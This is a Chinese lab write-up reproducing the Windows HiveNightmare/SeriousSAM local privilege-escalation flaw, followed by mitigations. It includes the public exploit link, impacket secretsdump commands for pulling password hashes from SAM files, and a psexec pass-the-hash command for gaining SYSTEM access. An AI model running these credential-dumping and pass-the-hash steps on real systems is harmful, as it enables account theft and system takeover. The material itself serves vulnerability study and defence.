漏洞介绍

7 月 20 日，微软确认了一个新的本地提权漏洞，该漏洞会影响 Windows 自 2018 年 10 月以来发布的版本，即 Windows 10 Version 1809 以后的版本。

不过值得注意的是该漏洞不影响 Windows Server 版本。

对于这个漏洞安全研究成员将其称为 HiveNightmare 或者 SeriousSAM ，该漏洞允许低权限的用户访问 Windows 系统文件，成功利用此漏洞的攻击者可以使用 SYSTEM 特权运行任意代码。

根据微软的介绍，出现本地提权漏洞是由于多个系统文件（包括安全账户管理器数据库SAM）过度许可访问控制列表所导致。

目前 POC 和 EXP 已经被公开，利用公开的 POC 可以低权限账号读取 SAM 等文件。

漏洞环境准备

首先进入我们的靶机中，在控制面板找到系统，选择系统保护，可以看到保护设置，现在是关闭的状态，我们选择配置将其开启，最大使用量不变。然后创建一个驱动器的还原点。

还有一个问题是，win10 win11默认空密码的本地账户是只允许进行控制台的登陆的，我们要将这个禁用掉。禁用方法是搜索本地安全组策略，在本地策略中选择安全选项，找到账户：使用空密码的本地账户只允许进行控制台登陆，选择已禁用即可。

漏洞复现

EXP 地址为：https://github.com/GossiTheDog/HiveNightmare

工具地址：https://github.com/SecureAuthCorp/impacket.git

首先我们可以使用如下命令来判断系统是否容易受到攻击

icacls c:\windows\system32\config\sam

如果出现BUILTIN\Users:(I)(RX)则表示该系统易收到攻击

下载exp后将作者编译好的EXP放到靶机中运行

可以看到在普通用户下，利用该漏洞读取到了SAM、SECURITY、SYSTEM三个文件。

然后我们利用刚刚下载好的工具获取目标的hash

cd impacket/examples

python ./secretsdump.py -sam SAM-2021-08-03 -system SYSTEM-2021-08-03 -security SECURITY-2021-08-03 LOCAL

再使用psexec.py利用刚刚得到的hash直接登陆管理员账户，来获得SYSTEM权限。

python ./psexec.py -hashes xxxxxxxxxx:xxxxxxxxxxxx administrator@IP cmd.exe

修复方案

目前该漏洞暂时还没有官方补丁。

可以通过以下方法来进行防御：

1、限制对 %windir%\system32\config 内容的访问

以管理员身份打开命令提示符或 Windows PowerShell

运行以下命令：icacls %windir%\system32\config. /inheritance:e

2、删除卷影复制服务 (VSS) 卷影副本

删除限制访问 %windir%\system32\config 之前存在的任何系统还原点和卷影卷，创建一个新的系统还原点（如果需要）。

再复现的过程中，发现如果administrator设置了密码或者启用了空密码的本地用户只允许的控制台登陆，都无法提权成功（虽然能拿到hash，但是无法获取会话）
